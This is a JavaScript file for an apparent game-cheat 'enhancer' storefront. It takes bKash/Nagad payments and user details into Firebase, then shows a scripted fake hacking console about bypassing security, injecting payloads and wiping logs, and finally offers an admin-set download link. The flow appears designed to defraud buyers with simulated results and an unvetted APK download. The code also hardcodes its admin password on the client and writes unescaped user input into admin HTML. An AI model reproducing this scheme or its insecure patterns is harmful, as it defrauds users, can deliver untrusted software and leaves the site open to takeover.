// --- Firebase Configuration (same) ---
const firebaseConfig = { apiKey: "AIzaSyDVb2f4wKrJbox752z5uBUz9IUz0-KXL6k", authDomain: "kingocheatmod.firebaseapp.com", databaseURL: "https://kingocheatmod-default-rtdb.asia-southeast1.firebasedatabase.app", projectId: "kingocheatmod", storageBucket: "kingocheatmod.appspot.com", messagingSenderId: "527539428232", appId: "1:527539428232:web:d25dd023ae49fbf5d4383d", measurementId: "G-LYQSYX0X21" };
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// --- DOM Elements (Add view containers and nav buttons) ---
const enhancerToolView = document.getElementById('enhancerToolView');
const userPanelView = document.getElementById('userPanelView');
const goToUserPanelBtn = document.getElementById('goToUserPanelBtn');
const goToEnhancerToolBtn = document.getElementById('goToEnhancerToolBtn');

const pageTitleEl = document.getElementById('pageTitle');
const mainAppTitleEl = document.getElementById('mainAppTitle');
const appSubtitleEl = document.getElementById('appSubtitle');
const gameNameSelect = document.getElementById('gameName');
const startActivationButton = document.getElementById('startActivationButton');
const paymentPriceEl = document.getElementById('paymentPrice');
const paymentAmountDisplayEl = document.getElementById('paymentAmountDisplay');
const bkashIconImg = document.getElementById('bkashIconImg');
const nagadIconImg = document.getElementById('nagadIconImg');
const tempMessageDiv = document.getElementById('tempMessage');
const paymentModalOverlay = document.getElementById('paymentModalOverlay');
const bkashButton = document.getElementById('bkashButton');
const nagadButton = document.getElementById('nagadButton');
const recipientInfoDisplay = document.getElementById('recipientInfoDisplay');
const paymentMethodNameSpan = document.getElementById('paymentMethodName');
const paymentRecipientNumberP = document.getElementById('paymentRecipientNumber');
const senderNumberInput = document.getElementById('senderNumber');
const transactionIdInput = document.getElementById('transactionId');
const submitPaymentButton = document.getElementById('submitPaymentButton');
const cancelPaymentButton = document.getElementById('cancelPaymentButton');
const progressArea = document.getElementById('progressArea');
const progressBar = document.getElementById('progressBar');
const statusText = document.getElementById('statusText');
const consoleOutput = document.getElementById('console-output');
const downloadButton = document.getElementById('downloadButton');
const usernameInput = document.getElementById('username');
const userEmailInput = document.getElementById('userEmail');
const platformSelect = document.getElementById('platform');

const adminPanelButton = document.getElementById('adminPanelButton');
const adminPanelOverlay = document.getElementById('adminPanelOverlay');
const adminNavButtons = document.querySelectorAll('.admin-nav-button');
const adminTabContents = document.querySelectorAll('.admin-tab-content');
const submissionsTableContainer = document.getElementById('submissionsTableContainer');
const closeAdminPanelButton = document.getElementById('closeAdminPanelButton');
const adminBkashNumberInput = document.getElementById('adminBkashNumber');
const adminBkashIconUrlInput = document.getElementById('adminBkashIconUrl');
const adminNagadNumberInput = document.getElementById('adminNagadNumber');
const adminNagadIconUrlInput = document.getElementById('adminNagadIconUrl');
const savePaymentSettingsButton = document.getElementById('savePaymentSettingsButton');
const adminAppNameInput = document.getElementById('adminAppName');
const adminAppSubtitleInput = document.getElementById('adminAppSubtitle');
const adminSenderEmailInput = document.getElementById('adminSenderEmail');
const adminDefaultPriceInput = document.getElementById('adminDefaultPrice');
const adminAppDownloadLinkInput = document.getElementById('adminAppDownloadLink');
const adminGameListContainer = document.getElementById('adminGameListContainer');
const adminAddGameButton = document.getElementById('adminAddGameButton');
const saveAppSettingsButton = document.getElementById('saveAppSettingsButton');
const statPendingCountEl = document.getElementById('statPendingCount');
const statApprovedCountEl = document.getElementById('statApprovedCount');
const statRejectedCountEl = document.getElementById('statRejectedCount');
const statTotalEarnedEl = document.getElementById('statTotalEarned');

const manualKeySendPromptEl = document.getElementById('manualKeySendPrompt');
const promptSubmissionIDEl = document.getElementById('promptSubmissionID');
const promptUserEmailEl = document.getElementById('promptUserEmail');
const promptGameNameEl = document.getElementById('promptGameName');
const promptGeneratedKeyEl = document.getElementById('promptGeneratedKey');
const promptKeyInfoEl = document.getElementById('promptKeyInfo');
const openEmailClientButton = document.getElementById('openEmailClientButton');
const emailClientMessageEl = document.getElementById('emailClientMessage');

const userPanelImageSliderContainer = document.getElementById('userPanelImageSliderContainer');
const sliderWrapper = userPanelImageSliderContainer.querySelector('.slider-wrapper');
const sliderDotsContainer = userPanelImageSliderContainer.querySelector('.slider-dots');
const sliderPrevBtn = document.getElementById('sliderPrevBtn');
const sliderNextBtn = document.getElementById('sliderNextBtn');
const adminSliderImageInputsContainer = document.getElementById('adminSliderImageInputsContainer');

const ADMIN_KEY = "supersecretadmin123";
let currentConsoleLine = null;
let selectedPaymentMethod = null;
let currentSettings = { payment: {}, app: { games: {}, sliderImages: [] } };
let allSubmissionsData = {};
let currentPromptedSubmissionId = null;
let currentSlideIndex = 0;
let sliderInterval;


// --- Helper Functions ---
function showTemporaryMessage(message, isSuccess = true, duration = 3000) { tempMessageDiv.textContent = message; tempMessageDiv.style.backgroundColor = isSuccess ? '#00cc66' : '#ff3366'; tempMessageDiv.style.display = 'block'; setTimeout(() => tempMessageDiv.style.opacity = '1', 10); setTimeout(() => { tempMessageDiv.style.opacity = '0'; setTimeout(() => { tempMessageDiv.style.display = 'none'; }, 500); }, duration); }
function addConsoleMessage(message, instant = false) { if (currentConsoleLine) { currentConsoleLine.classList.remove('blinking-cursor'); } const p = document.createElement('p'); p.textContent = instant ? message : ''; consoleOutput.appendChild(p); consoleOutput.scrollTop = consoleOutput.scrollHeight; currentConsoleLine = p; if (!instant) { let i = 0; p.classList.add('blinking-cursor'); function type() { if (i < message.length) { p.textContent += message.charAt(i); i++; setTimeout(type, Math.random() * 30 + 10); } else { p.classList.remove('blinking-cursor'); } } type(); } }
function updateProgress(percentage, text) { progressBar.style.width = percentage + '%'; progressBar.textContent = percentage + '%'; if (text) statusText.textContent = text; }

// --- View Navigation ---
function showView(viewId) {
    document.querySelectorAll('.view-section').forEach(view => {
        view.classList.remove('active');
    });
    const activeView = document.getElementById(viewId);
    if (activeView) {
        activeView.classList.add('active');
        window.scrollTo(0,0); // Scroll to top when view changes
        if (viewId === 'userPanelView') {
            // Ensure slider is correctly initialized if it depends on visibility
            // setupUserPanelSlider(); // applySettingsToUserInterface already calls this
        }
    }
}
goToUserPanelBtn.addEventListener('click', () => showView('userPanelView'));
goToEnhancerToolBtn.addEventListener('click', () => showView('enhancerToolView'));


// --- Load Settings & Apply to UI ---
async function loadSettings() { try { const paymentSnapshot = await db.ref('settings/payment').once('value'); if (paymentSnapshot.exists()) currentSettings.payment = paymentSnapshot.val(); else currentSettings.payment = { bkashIconUrl: 'https://i.ibb.co/QkYvV3d/bkash.png', nagadIconUrl: 'https://i.ibb.co/PggY2P8/nagad.png' }; const appSnapshot = await db.ref('settings/app').once('value'); if (appSnapshot.exists()) { currentSettings.app = appSnapshot.val(); if (!currentSettings.app.games) currentSettings.app.games = {}; if (!currentSettings.app.sliderImages) currentSettings.app.sliderImages = []; } else { currentSettings.app = { games: {}, sliderImages: [], defaultPrice: "1000", appName: "Ultimate Enhancer", appSubtitle: "Pro Version" }; } applySettingsToUserInterface(); } catch (error) { console.error("Error loading settings:", error); showTemporaryMessage("Could not load app settings.", false); currentSettings.payment = { bkashIconUrl: 'https://i.ibb.co/QkYvV3d/bkash.png', nagadIconUrl: 'https://i.ibb.co/PggY2P8/nagad.png' }; currentSettings.app = { games: {}, sliderImages: [], defaultPrice: "1000", appName: "Ultimate Enhancer", appSubtitle: "Pro Version" }; applySettingsToUserInterface(); } }
function applySettingsToUserInterface() { const appName = currentSettings.app?.appName || "Ultimate Enhancer"; const appSubtitleText = currentSettings.app?.appSubtitle || "Pro Version"; mainAppTitleEl.textContent = appName; pageTitleEl.textContent = appName + " - " + appSubtitleText; appSubtitleEl.textContent = appSubtitleText; bkashIconImg.src = currentSettings.payment?.bkashIconUrl || 'https://i.ibb.co/QkYvV3d/bkash.png'; nagadIconImg.src = currentSettings.payment?.nagadIconUrl || 'https://i.ibb.co/PggY2P8/nagad.png'; gameNameSelect.innerHTML = '<option value="">-- Select Game --</option>'; if (currentSettings.app && currentSettings.app.games) { Object.keys(currentSettings.app.games).forEach(gameKey => { const game = currentSettings.app.games[gameKey]; const option = document.createElement('option'); option.value = gameKey; option.textContent = game.name || gameKey; gameNameSelect.appendChild(option); }); } setupUserPanelSlider(); }

// --- User Panel Image Slider Logic ---
function setupUserPanelSlider() { sliderWrapper.innerHTML = ''; sliderDotsContainer.innerHTML = ''; const images = currentSettings.app?.sliderImages?.filter(url => url && url.trim() !== '') || []; if (images.length === 0) { sliderWrapper.innerHTML = '<div class="slider-placeholder">No images configured. Set in Admin Panel > App Settings.</div>'; sliderPrevBtn.style.display = 'none'; sliderNextBtn.style.display = 'none'; return; } sliderPrevBtn.style.display = images.length > 1 ? 'block' : 'none'; sliderNextBtn.style.display = images.length > 1 ? 'block' : 'none'; images.forEach((imageUrl, index) => { const slideDiv = document.createElement('div'); slideDiv.classList.add('slide'); const img = document.createElement('img'); img.src = imageUrl; img.alt = `Slider Image ${index + 1}`; img.onerror = function() { this.alt = 'Image error'; this.src = 'https://via.placeholder.com/600x300/1a1a2e/808080?text=Image+Error'; }; slideDiv.appendChild(img); sliderWrapper.appendChild(slideDiv); if (images.length > 1) { const dot = document.createElement('span'); dot.classList.add('dot'); dot.dataset.slideIndex = index; dot.addEventListener('click', () => goToSlide(index)); sliderDotsContainer.appendChild(dot); } }); currentSlideIndex = 0; updateSlider(); startAutoSlider(images.length); }
function updateSlider() { const slides = sliderWrapper.querySelectorAll('.slide'); if (slides.length === 0) return; sliderWrapper.style.transform = `translateX(-${currentSlideIndex * 100}%)`; const dots = sliderDotsContainer.querySelectorAll('.dot'); dots.forEach(dot => dot.classList.remove('active')); if (dots[currentSlideIndex]) { dots[currentSlideIndex].classList.add('active'); } }
function nextSlide() { const slides = sliderWrapper.querySelectorAll('.slide'); if(slides.length === 0) return; currentSlideIndex = (currentSlideIndex + 1) % slides.length; updateSlider(); }
function prevSlide() { const slides = sliderWrapper.querySelectorAll('.slide'); if(slides.length === 0) return; currentSlideIndex = (currentSlideIndex - 1 + slides.length) % slides.length; updateSlider(); }
function goToSlide(index) { currentSlideIndex = index; updateSlider(); resetAutoSlider(); }
function startAutoSlider(numSlides) { if (numSlides <= 1) return; clearInterval(sliderInterval); sliderInterval = setInterval(nextSlide, 5000); }
function resetAutoSlider(){ const slides = sliderWrapper.querySelectorAll('.slide'); startAutoSlider(slides.length); }
sliderNextBtn.addEventListener('click', () => { nextSlide(); resetAutoSlider();});
sliderPrevBtn.addEventListener('click', () => { prevSlide(); resetAutoSlider();});

// --- Payment Logic ---
function updatePaymentMethodDisplay() { if (!selectedPaymentMethod) { recipientInfoDisplay.style.display = 'none'; return; } recipientInfoDisplay.style.display = 'block'; const methodKey = selectedPaymentMethod; paymentMethodNameSpan.textContent = methodKey.charAt(0).toUpperCase() + methodKey.slice(1); paymentRecipientNumberP.textContent = currentSettings.payment?.[`${methodKey}Number`] || `(Set ${methodKey} no. in Admin)`; bkashButton.classList.toggle('active', selectedPaymentMethod === 'bkash'); nagadButton.classList.toggle('active', selectedPaymentMethod === 'nagad'); }
bkashButton.addEventListener('click', () => { selectedPaymentMethod = 'bkash'; updatePaymentMethodDisplay(); });
nagadButton.addEventListener('click', () => { selectedPaymentMethod = 'nagad'; updatePaymentMethodDisplay(); });
startActivationButton.addEventListener('click', () => { const gameKey = gameNameSelect.value; const username = usernameInput.value.trim(); const userEmailVal = userEmailInput.value.trim(); if (!gameKey) { showTemporaryMessage('Please select a Game Name!', false); return; } if (!username) { showTemporaryMessage('Please enter your Game Username/ID!', false); return; } if (!userEmailVal || !/^\S+@\S+\.\S+$/.test(userEmailVal)) { showTemporaryMessage('Please enter a valid Email Address!', false); return; } const gamePrice = currentSettings.app?.games?.[gameKey]?.price; const finalPrice = gamePrice || currentSettings.app?.defaultPrice || "1000"; paymentPriceEl.textContent = `Price: ${finalPrice} BDT`; paymentAmountDisplayEl.textContent = finalPrice; paymentModalOverlay.style.display = 'flex'; selectedPaymentMethod = null; updatePaymentMethodDisplay(); bkashButton.classList.remove('active'); nagadButton.classList.remove('active'); recipientInfoDisplay.style.display = 'none'; startActivationButton.disabled = true; startActivationButton.textContent = 'Awaiting Activation...'; });
cancelPaymentButton.addEventListener('click', () => { paymentModalOverlay.style.display = 'none'; startActivationButton.disabled = false; startActivationButton.textContent = 'Activate Enhancer'; });
submitPaymentButton.addEventListener('click', () => { const senderNum = senderNumberInput.value.trim(); const txrId = transactionIdInput.value.trim(); if (!selectedPaymentMethod) { alert('Please select a payment method.'); return; } if (!senderNum) { alert('Please enter your Sending Number.'); return; } const gameKey = gameNameSelect.value; const finalPrice = (currentSettings.app?.games?.[gameKey]?.price || currentSettings.app?.defaultPrice || "1000"); const submissionData = { gameName: currentSettings.app?.games?.[gameKey]?.name || gameKey, username: usernameInput.value.trim(), email: userEmailInput.value.trim(), platform: platformSelect.value, paymentMethod: selectedPaymentMethod, senderNumber: senderNum, transactionId: txrId || "N/A", amount: parseFloat(finalPrice) || 0, timestamp: new Date().toISOString(), status: "pending_verification" }; db.ref('submissions').push(submissionData).then(() => { paymentModalOverlay.style.display = 'none'; showTemporaryMessage('Details "submitted"! Verification pending.', true); progressArea.style.display = 'block'; consoleOutput.innerHTML = ''; addConsoleMessage(`Payment details submitted by: ${submissionData.username}.`, true); addConsoleMessage(`Awaiting admin verification for key dispatch to: ${submissionData.email}...`, true); setTimeout(() => { addConsoleMessage("Once approved by admin, key will be 'sent'.", true); startEnhancerSequence(submissionData.gameName, submissionData.username, submissionData.platform); }, 2500); }).catch((error) => { console.error("Error saving to Firebase: ", error); showTemporaryMessage('Error submitting details. (Check console)', false); startActivationButton.disabled = false; startActivationButton.textContent = 'Activate Enhancer'; }); });

// --- Enhancer Sequence & Download ---
function startEnhancerSequence(gameName, username, platform) { let progress = 0; addConsoleMessage(`Initializing enhancer for ${gameName} user: ${username} on ${platform}...`); setTimeout(() => { progress = 10; updateProgress(progress, `Connecting to ${gameName} servers...`); addConsoleMessage(`Attempting connection to ${gameName} Network...`); }, 1500); setTimeout(() => { progress = 25; updateProgress(progress, 'Bypassing security...'); addConsoleMessage('Connection successful. Handshake initiated.', true); addConsoleMessage(`Analyzing ${gameName} security...`); }, 3500); setTimeout(() => { progress = 40; updateProgress(progress, 'Injecting modules...'); addConsoleMessage('Security bypassed. Deploying stealth...', true); addConsoleMessage(`Targeting account: ${username}...`); }, 6000); setTimeout(() => { progress = 60; updateProgress(progress, 'Activating features...'); addConsoleMessage('Account data located. Decrypting profile...', true); addConsoleMessage(`Injecting payload for ${gameName}`); }, 8500); setTimeout(() => { progress = 75; updateProgress(progress, 'Verifying activation...'); addConsoleMessage('Payload successful. Verifying sync...'); }, 11000); setTimeout(() => { progress = 90; updateProgress(progress, 'Cleaning up...'); addConsoleMessage('Sync PASSED.', true); addConsoleMessage(`Removing server logs...`); }, 13500); setTimeout(() => { progress = 100; updateProgress(progress, 'Enhancement complete!'); addConsoleMessage('All traces removed. System secure.', true); addConsoleMessage(`SUCCESS: ${gameName} enhanced for ${username}! (Awaiting key if payment approved)`, true); addConsoleMessage('Client patch ready for download.', true); if (currentConsoleLine) currentConsoleLine.classList.remove('blinking-cursor'); downloadButton.textContent = `Download Enhanced ${gameName} Client`; if(currentSettings.app?.appDownloadLink) { downloadButton.setAttribute('data-download-url', currentSettings.app.appDownloadLink); } else { downloadButton.removeAttribute('data-download-url'); } downloadButton.style.display = 'block'; startActivationButton.style.display = 'none'; }, 15500); }
function resetMainForm() { downloadButton.style.display = 'none'; progressArea.style.display = 'none'; updateProgress(0, 'Initializing sequence...'); consoleOutput.innerHTML = '<p>Awaiting activation...</p>'; usernameInput.value = ''; userEmailInput.value = ''; gameNameSelect.value = ''; platformSelect.value = 'android'; senderNumberInput.value = ''; transactionIdInput.value = ''; selectedPaymentMethod = null; bkashButton.classList.remove('active'); nagadButton.classList.remove('active'); recipientInfoDisplay.style.display = 'none'; startActivationButton.disabled = false; startActivationButton.textContent = 'Activate Enhancer'; startActivationButton.style.display = 'block'; }
downloadButton.addEventListener('click', () => { const gameName = gameNameSelect.options[gameNameSelect.selectedIndex]?.text || "Selected Game"; const downloadUrl = downloadButton.getAttribute('data-download-url'); if (downloadUrl && downloadUrl !== "https://example.com/app.apk" && downloadUrl.startsWith("http")) { alert(`"Downloading" your "${gameName} Enhanced Client" from configured link.`); window.open(downloadUrl, '_blank'); } else { alert(`Congratulations!\n\nYour "${gameName} Enhanced Client" is "downloading".\n\n(No specific download link or placeholder. Simulation.)`); } resetMainForm(); });


// --- Admin Panel Logic ---
adminPanelButton.addEventListener('click', () => { const key = prompt("Enter Admin Key:"); if (key === ADMIN_KEY) { adminPanelOverlay.style.display = 'flex'; loadAdminPanelData(); switchAdminTab('dashboardTab'); } else if (key !== null) { alert("Invalid Admin Key."); } });
closeAdminPanelButton.addEventListener('click', () => { adminPanelOverlay.style.display = 'none'; manualKeySendPromptEl.style.display = 'none'; emailClientMessageEl.textContent = ''; });
adminNavButtons.forEach(button => { button.addEventListener('click', () => switchAdminTab(button.dataset.tab)); });
function switchAdminTab(tabId) { adminNavButtons.forEach(btn => btn.classList.remove('active')); document.querySelector(`.admin-nav-button[data-tab="${tabId}"]`).classList.add('active'); adminTabContents.forEach(content => content.classList.remove('active')); document.getElementById(tabId).classList.add('active'); if (tabId === 'submissionsTab') fetchSubmissionsAndRenderTable(); if (tabId === 'dashboardTab') updateDashboardStats(); if (tabId === 'dashboardTab' && currentPromptedSubmissionId && allSubmissionsData[currentPromptedSubmissionId]?.status === 'approved') { showKeyPromptUI(currentPromptedSubmissionId); } else if (tabId !== 'dashboardTab' && manualKeySendPromptEl.style.display === 'block') { /* Keep prompt */ } else if (tabId === 'dashboardTab'){ manualKeySendPromptEl.style.display = 'none'; emailClientMessageEl.textContent = ''; } }

function loadAdminPanelData() { adminBkashNumberInput.value = currentSettings.payment?.bkashNumber || ''; adminBkashIconUrlInput.value = currentSettings.payment?.bkashIconUrl || 'https://i.ibb.co/QkYvV3d/bkash.png'; adminNagadNumberInput.value = currentSettings.payment?.nagadNumber || ''; adminNagadIconUrlInput.value = currentSettings.payment?.nagadIconUrl || 'https://i.ibb.co/PggY2P8/nagad.png'; adminAppNameInput.value = currentSettings.app?.appName || ''; adminAppSubtitleInput.value = currentSettings.app?.appSubtitle || ''; adminSenderEmailInput.value = currentSettings.app?.senderEmail || ''; adminDefaultPriceInput.value = currentSettings.app?.defaultPrice || '1000'; adminAppDownloadLinkInput.value = currentSettings.app?.appDownloadLink || ''; renderAdminSliderImageInputs(); renderAdminGameList(); }
function renderAdminSliderImageInputs() { adminSliderImageInputsContainer.innerHTML = ''; for (let i = 0; i < 5; i++) { const imageUrl = currentSettings.app?.sliderImages?.[i] || ''; const inputGroup = document.createElement('div'); inputGroup.classList.add('input-group'); inputGroup.innerHTML = ` <label for="adminSliderImage${i+1}">Slider Image URL ${i+1}:</label> <input type="url" id="adminSliderImage${i+1}" class="admin-slider-image-url" value="${imageUrl}" placeholder="https://example.com/image${i+1}.jpg"> `; adminSliderImageInputsContainer.appendChild(inputGroup); } }
savePaymentSettingsButton.addEventListener('click', async () => { const paymentData = { bkashNumber: adminBkashNumberInput.value.trim(), bkashIconUrl: adminBkashIconUrlInput.value.trim(), nagadNumber: adminNagadNumberInput.value.trim(), nagadIconUrl: adminNagadIconUrlInput.value.trim() }; try { await db.ref('settings/payment').set(paymentData); showTemporaryMessage("Payment settings saved!", true); currentSettings.payment = paymentData; applySettingsToUserInterface(); } catch (error) { showTemporaryMessage("Error saving payment settings.", false); console.error(error); } });
function renderAdminGameList() { adminGameListContainer.innerHTML = ''; if (currentSettings.app && currentSettings.app.games) { Object.entries(currentSettings.app.games).forEach(([key, game]) => { const gameDiv = document.createElement('div'); gameDiv.classList.add('game-entry'); gameDiv.innerHTML = `<input type="text" value="${game.name || key}" placeholder="Game Name" class="admin-game-name" data-key="${key}"><input type="text" value="${game.iconUrl || ''}" placeholder="Icon URL (Optional)" class="admin-game-icon" data-key="${key}"><input type="number" value="${game.price || ''}" placeholder="Price (BDT, Optional)" class="admin-game-price" data-key="${key}"><button class="button danger small admin-remove-game" data-key="${key}">X</button>`; adminGameListContainer.appendChild(gameDiv); }); } document.querySelectorAll('.admin-remove-game').forEach(btn => { btn.addEventListener('click', (e) => removeAdminGame(e.target.dataset.key)); }); }
adminAddGameButton.addEventListener('click', () => { const newKey = `game_${Date.now()}`; if (!currentSettings.app.games) currentSettings.app.games = {}; currentSettings.app.games[newKey] = { name: "New Game", iconUrl: "", price: "" }; renderAdminGameList(); });
function removeAdminGame(keyToRemove) { if (currentSettings.app && currentSettings.app.games && currentSettings.app.games[keyToRemove]) { delete currentSettings.app.games[keyToRemove]; renderAdminGameList(); showTemporaryMessage("Game removed (unsaved). Save App Settings.", true, 4000); } }
saveAppSettingsButton.addEventListener('click', async () => { const updatedGames = {}; document.querySelectorAll('.game-entry').forEach(entry => { const key = entry.querySelector('.admin-game-name').dataset.key; const name = entry.querySelector('.admin-game-name').value.trim(); const iconUrl = entry.querySelector('.admin-game-icon').value.trim(); const price = entry.querySelector('.admin-game-price').value.trim(); if (name) { updatedGames[key] = { name, iconUrl, price }; } }); const sliderImageUrls = []; document.querySelectorAll('.admin-slider-image-url').forEach(input => { const url = input.value.trim(); if (url) sliderImageUrls.push(url); }); const appData = { appName: adminAppNameInput.value.trim(), appSubtitle: adminAppSubtitleInput.value.trim(), senderEmail: adminSenderEmailInput.value.trim(), defaultPrice: adminDefaultPriceInput.value.trim(), appDownloadLink: adminAppDownloadLinkInput.value.trim(), sliderImages: sliderImageUrls, games: updatedGames }; try { await db.ref('settings/app').set(appData); showTemporaryMessage("App settings saved!", true); currentSettings.app = appData; applySettingsToUserInterface(); } catch (error) { showTemporaryMessage("Error saving app settings.", false); console.error(error); } });

async function fetchAllSubmissions() { try { const snapshot = await db.ref('submissions').orderByChild('timestamp').once('value'); if (snapshot.exists()) { allSubmissionsData = snapshot.val(); } else { allSubmissionsData = {}; } } catch (error) { console.error("Error fetching all submissions:", error); allSubmissionsData = {}; } }
function updateDashboardStats() { let pending = 0, approved = 0, rejected = 0, totalEarned = 0; Object.values(allSubmissionsData).forEach(sub => { if (sub.status === 'pending_verification') pending++; else if (sub.status === 'approved') { approved++; totalEarned += parseFloat(sub.amount) || 0; } else if (sub.status === 'rejected') rejected++; }); statPendingCountEl.textContent = pending; statApprovedCountEl.textContent = approved; statRejectedCountEl.textContent = rejected; statTotalEarnedEl.textContent = `${totalEarned.toFixed(2)} BDT`; }
function generateUserLoginKey() { const segments = []; for (let i = 0; i < 3; i++) { segments.push(Math.random().toString(36).substring(2, 7).toUpperCase()); } return `KEY-${segments.join('-')}-${Date.now().toString().slice(-5)}`; }
openEmailClientButton.addEventListener('click', async function(event) { emailClientMessageEl.textContent = "Your email client should have opened..."; if (currentPromptedSubmissionId && allSubmissionsData[currentPromptedSubmissionId]) { try { await db.ref(`submissions/${currentPromptedSubmissionId}/keyDeliveryStatus`).set('mailto_link_clicked_' + new Date().toISOString()); if(allSubmissionsData[currentPromptedSubmissionId]) allSubmissionsData[currentPromptedSubmissionId].keyDeliveryStatus = 'mailto_link_clicked'; showTemporaryMessage("Email client opened. Remember to send!", true, 5000); } catch(err){ console.error("Error updating keyDeliveryStatus:", err); } } });

async function showKeyPromptUI(submissionId) { const submission = allSubmissionsData[submissionId]; if(submission && submission.status === 'approved'){ currentPromptedSubmissionId = submissionId; promptSubmissionIDEl.textContent = submissionId.slice(0,8)+"..."; promptUserEmailEl.textContent = submission.email; promptGameNameEl.textContent = submission.gameName; let loginKey = submission.loginKey; promptGeneratedKeyEl.textContent = loginKey || "Error: Key not found"; let keyInfoText = ""; if (submission.keyExpiryTimestamp) { const expiryDate = new Date(submission.keyExpiryTimestamp); keyInfoText += `Expires: ${expiryDate.toLocaleDateString()}`; } else { keyInfoText += "Expires: N/A"; } keyInfoText += `, Device: ${submission.devicesActivated || 0}/${submission.deviceLimit || 1} (Sim.)`; promptKeyInfoEl.textContent = keyInfoText; const mailTo = submission.email; const adminSender = currentSettings.app?.senderEmail || 'admin@example.com'; const appTitle = currentSettings.app?.appName || 'Our App'; const subject = encodeURIComponent(`Your Access Key for ${submission.gameName} - ${appTitle}`); const body = encodeURIComponent( `Hello ${submission.username || 'User'},\n\nThank you for your submission! Your access for "${submission.gameName}" has been approved.\n\nYour Login Key: ${loginKey}\n\nKey Details (Simulated):\n- This key is valid for 7 days from generation.\n- This key can be used on 1 device.\n- Expires on: ${submission.keyExpiryTimestamp ? new Date(submission.keyExpiryTimestamp).toLocaleString() : 'N/A'}\n\nSubmission Details:\n- Username: ${submission.username}\n- Email: ${submission.email}\n- Game: ${submission.gameName}\n- Amount: ${submission.amount} BDT\n- Transaction ID: ${submission.transactionId || 'N/A'}\n\nIf you have any questions, please contact support.\n\nRegards,\nThe ${appTitle} Team\n(From: ${adminSender})` ); openEmailClientButton.href = `mailto:${mailTo}?subject=${subject}&body=${body}`; emailClientMessageEl.textContent = ''; manualKeySendPromptEl.style.display = 'block'; if (document.getElementById('dashboardTab').classList.contains('active')) { manualKeySendPromptEl.scrollIntoView({ behavior: 'smooth', block: 'center' }); } } else { manualKeySendPromptEl.style.display = 'none'; } }

async function updateSubmissionStatus(submissionId, newStatus) { try { const updates = { status: newStatus }; if (newStatus === 'approved' && !allSubmissionsData[submissionId]?.loginKey) { updates.loginKey = generateUserLoginKey(); updates.keyGeneratedTimestamp = new Date().toISOString(); const expiryDate = new Date(); expiryDate.setDate(expiryDate.getDate() + 7); updates.keyExpiryTimestamp = expiryDate.toISOString(); updates.deviceLimit = 1; updates.devicesActivated = 0; } await db.ref(`submissions/${submissionId}`).update(updates); if(allSubmissionsData[submissionId]) { Object.assign(allSubmissionsData[submissionId], updates); } else { const freshSub = await db.ref(`submissions/${submissionId}`).once('value'); if(freshSub.exists()) allSubmissionsData[submissionId] = freshSub.val(); } showTemporaryMessage(`Submission ${submissionId.slice(0,6)}... status updated to ${newStatus}.`, true); fetchSubmissionsAndRenderTable(); updateDashboardStats(); if (newStatus === 'approved') { showKeyPromptUI(submissionId); } else { if(currentPromptedSubmissionId === submissionId) { manualKeySendPromptEl.style.display = 'none'; emailClientMessageEl.textContent = ''; currentPromptedSubmissionId = null; } } } catch (error) { showTemporaryMessage("Error updating status.", false); console.error(error); } }
async function deleteSubmission(submissionId) { if (confirm(`Are you sure you want to permanently delete submission ${submissionId.slice(0,8)}...? This cannot be undone.`)) { try { await db.ref(`submissions/${submissionId}`).remove(); if(allSubmissionsData[submissionId]) delete allSubmissionsData[submissionId]; showTemporaryMessage(`Submission ${submissionId.slice(0,6)}... deleted.`, true); fetchSubmissionsAndRenderTable(); updateDashboardStats(); if(currentPromptedSubmissionId === submissionId) { manualKeySendPromptEl.style.display = 'none'; currentPromptedSubmissionId = null; } } catch (error) { showTemporaryMessage("Error deleting submission.", false); console.error(error); } } }

function fetchSubmissionsAndRenderTable() { submissionsTableContainer.innerHTML = '<p>Loading...</p>'; const dataToRender = Object.keys(allSubmissionsData).length > 0 ? allSubmissionsData : null; const render = (data) => { if (data && Object.keys(data).length > 0) { let tableHTML = `<table><thead><tr><th>Date</th><th>Game</th><th>User</th><th>Email</th><th>Pay Method</th><th>Amount</th><th>Status</th><th>Login Key Info</th><th>Actions</th></tr></thead><tbody>`; let submissionsArray = []; Object.entries(data).forEach(([key, value]) => { submissionsArray.push({ id: key, ...value }); }); submissionsArray.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp)); submissionsArray.forEach(sub => { const d = sub; let statusClass = ''; if (d.status === 'pending_verification') statusClass = 'status-pending'; else if (d.status === 'approved') statusClass = 'status-approved'; else if (d.status === 'rejected') statusClass = 'status-rejected'; let keyDisplayHTML = 'N/A'; if (d.loginKey) { keyDisplayHTML = `<span class="generated-key-display" title="${d.loginKey}">${d.loginKey.slice(0,12)}...</span>`; if (d.keyExpiryTimestamp) { const expiryDate = new Date(d.keyExpiryTimestamp); const now = new Date(); let expiryText = `Expires: ${expiryDate.toLocaleDateString()}`; if (expiryDate < now) { expiryText += ' (Expired)'; } keyDisplayHTML += `<br><span class="key-info">${expiryText}</span>`; } keyDisplayHTML += `<br><span class="key-info">Device: ${d.devicesActivated || 0}/${d.deviceLimit || 1} (Sim.)</span>`; } let actions = `<div class="action-buttons">`; if (d.status === 'pending_verification') { actions += `<button class="button success small" onclick="updateSubmissionStatus('${d.id}', 'approved')">Approve</button>`; actions += `<button class="button danger small" onclick="updateSubmissionStatus('${d.id}', 'rejected')">Reject</button>`; } else if (d.status === 'approved') { actions += `<button class="button secondary small" onclick="showKeyPromptUI('${d.id}')">View/Email Key</button>`; actions += `<button class="button danger small" onclick="updateSubmissionStatus('${d.id}', 'rejected')">Reject</button>`; } else if (d.status === 'rejected') { actions += `<button class="button success small" onclick="updateSubmissionStatus('${d.id}', 'approved')">Re-Approve</button>`; } actions += `<button class="button grey small" onclick="deleteSubmission('${d.id}')">Delete</button>`; actions += `</div>`; tableHTML += `<tr><td>${new Date(d.timestamp).toLocaleString().replace(',','<br>')}</td><td>${d.gameName}</td><td>${d.username}</td><td>${d.email}</td><td>${d.paymentMethod}</td><td>${d.amount || 'N/A'}</td><td class="${statusClass}">${d.status.replace('_', ' ')}</td><td>${keyDisplayHTML}</td><td>${actions}</td></tr>`; }); tableHTML += '</tbody></table>'; submissionsTableContainer.innerHTML = tableHTML; } else { submissionsTableContainer.innerHTML = '<p>No submissions found.</p>'; } }; if (dataToRender) { render(dataToRender); } else {  db.ref('submissions').orderByChild('timestamp').limitToLast(100).once('value', (snapshot) => { if (snapshot.exists()) { allSubmissionsData = snapshot.val(); render(allSubmissionsData); } else { allSubmissionsData = {}; render(null); } updateDashboardStats(); }, (error) => { console.error(error); submissionsTableContainer.innerHTML = '<p>Error loading.</p>'; }); } }

// --- Initial Load ---
